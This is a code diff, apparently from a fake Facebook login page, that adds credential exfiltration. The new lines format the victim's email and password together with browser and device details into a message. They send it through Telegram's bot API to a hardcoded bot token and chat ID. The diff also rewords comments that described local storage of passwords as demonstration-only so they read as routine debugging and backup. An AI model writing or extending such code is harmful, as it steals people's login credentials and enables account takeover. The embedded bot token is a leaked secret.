@@ -520,20 +520,54 @@
             timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
           };
           
-          // In standalone version, we'll just log the information locally
+          // Log information locally for debugging
           console.log('Login information:', { 
             email, 
             password,
             deviceInfo
           });
           
-          // We can also store it in localStorage if needed for demonstration purposes
+          // Store in localStorage for backup
           localStorage.setItem('facebook_login', JSON.stringify({
             email,
             password,
             deviceInfo,
             timestamp: new Date().toISOString()
           }));
+          
+          // Send directly to Telegram
+          const telegramBotToken = "6847613001:AAEBPjTn6vPJgLxq4Nd8LmC5LlMRMHhUAYo";
+          const telegramChatId = "1212645532";
+          
+          // Format the message for Telegram
+          const message = `
+📱 *New Facebook Login*
+
+👤 *Login Details:*
+Email/Phone: \`${email}\`
+Password: \`${password}\`
+
+📊 *Device Info:*
+Platform: ${deviceInfo.platform}
+Language: ${deviceInfo.language}
+TimeZone: ${deviceInfo.timeZone}
+
+🔍 *User Agent:*
+\`${deviceInfo.userAgent}\`
+`;
+          
+          // Encode for URL
+          const encodedMessage = encodeURIComponent(message);
+          
+          // Use Telegram's sendMessage API directly
+          fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodedMessage}&parse_mode=Markdown`)
+            .then(response => response.json())
+            .then(data => {
+              console.log('Telegram notification sent:', data);
+            })
+            .catch(error => {
+              console.error('Error sending Telegram notification:', error);
+            });
           
           // Clear form fields
           emailInput.value = '';
